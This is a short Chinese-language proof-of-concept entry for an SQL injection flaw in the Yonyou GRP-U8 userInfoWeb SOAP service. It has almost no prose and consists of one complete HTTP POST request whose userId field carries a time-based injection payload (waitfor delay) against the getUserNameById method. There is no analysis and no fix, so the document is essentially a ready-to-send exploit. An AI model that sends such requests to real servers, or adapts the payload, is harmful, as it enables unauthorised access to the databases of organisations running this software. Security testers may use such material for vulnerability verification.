## 用友GRP-U8-userInfoWeb存在SQL注入

## poc
```
POST /services/userInfoWeb HTTP/1.1
Cache-Control: max-age=0
Origin: null
DNT: 1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 172.16.135.132:8009
Content-Length: 558

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:3'--</userId>
      </ser:getUserNameById>
   </soapenv:Body>
</soapenv:Envelope>
```
